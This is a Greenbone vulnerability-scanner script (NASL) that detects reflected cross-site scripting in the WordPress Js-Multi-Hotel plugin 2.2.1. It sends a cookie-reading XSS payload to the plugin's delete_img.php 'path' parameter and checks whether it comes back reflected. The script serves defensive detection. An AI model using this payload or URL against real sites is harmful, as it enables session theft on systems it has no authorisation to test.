# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804572");
  script_version("2023-07-27T05:05:09+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:09 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-05-08 11:09:59 +0530 (Thu, 08 May 2014)");
  script_name("WordPress Js-Multi-Hotel Plugin Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The WordPress plugin 'Js-Multi-Hotel' is prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Input passed via the 'file' parameter show_image.php and 'path' parameter
  to delete_img.php are not properly sanitized before being returned to the user.

  - The /functions.php, /myCalendar.php, /refreshDate.php, /show_image.php,
  /widget.php, /phpthumb/GdThumb.inc.php, /phpthumb/thumb_plugins/gd_reflection.inc.php,
  and /includes/timthumb.php scripts discloses the software's installation path.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site,
and cause a denial of service via CPU consumption.");
  script_tag(name:"affected", value:"WordPress JS MultiHotel Plugin version 2.2.1, Other versions may also be
affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://websecurity.com.ua/7082");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66529");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125959");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Mar/413");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/js-multihotel/includes/delete_img.php'
          + '?path=<body onload=with(document)alert(cookie)>';

## Extra Check is not possible
if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<body onload=with\(document\)alert\(cookie\)>"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
